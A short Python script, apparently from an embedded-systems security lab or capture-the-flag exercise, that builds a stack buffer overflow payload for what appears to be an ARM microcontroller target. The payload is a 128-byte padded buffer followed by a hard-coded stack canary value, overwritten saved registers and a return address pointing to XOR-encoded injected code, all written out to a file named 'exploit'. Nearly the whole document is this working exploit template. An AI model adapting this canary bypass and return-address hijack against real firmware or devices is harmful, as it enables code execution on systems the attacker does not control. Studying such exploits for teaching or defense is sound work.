import struct

# Parameters
buffer_size = 128# Replace with actual buffer size
return_address_offset = 16 #(needs to be replaced with canary stuff)  # Replace with actual offset to return address
injected_code_address = 0x0800034a + 0x01# Address of injected code
canary = 0x23d58132

# Injected code (binary representation of the assembly code above)
original_injected_code = b"\xff"

padding = b"\xff" * ((buffer_size - len(original_injected_code)))

# callee saved registers

r7 = b"\xef\xbe\xad\xde"  # r7
r7 = b"\x00\x00\x00\x00"  # r7
r6 = b"\xdc\x07\x00\x10"  # r6
r5 = b"\xc8\x07\x00\x10"  # r5
r4 = b"\x90\x02\x00\x08"  # r4

r_ukwn = b"\x9c\x00\x00\x00"

canary = b"\x32\x81\xd5\x23"  # Canary value in little-endian format


# Overwrite return address
return_address = struct.pack("<I", injected_code_address)

# XOR key (hex: 4242424242424242)
xor_key = b"\x42\x42\x42\x42\x42\x42\x42\x42"

# XOR the injected code with the key
injected_code = bytes([original_injected_code[i] ^ xor_key[i % len(xor_key)] for i in range(len(original_injected_code))])

# Combine exploit
exploit = injected_code + padding + canary + r_ukwn + r4 + r5 + r6 + r7 + return_address

# Save to binary file
with open("exploit", "wb") as f:
    f.write(exploit)

# with open("exploit_hex", "w") as f:
#     f.write(exploit.hex())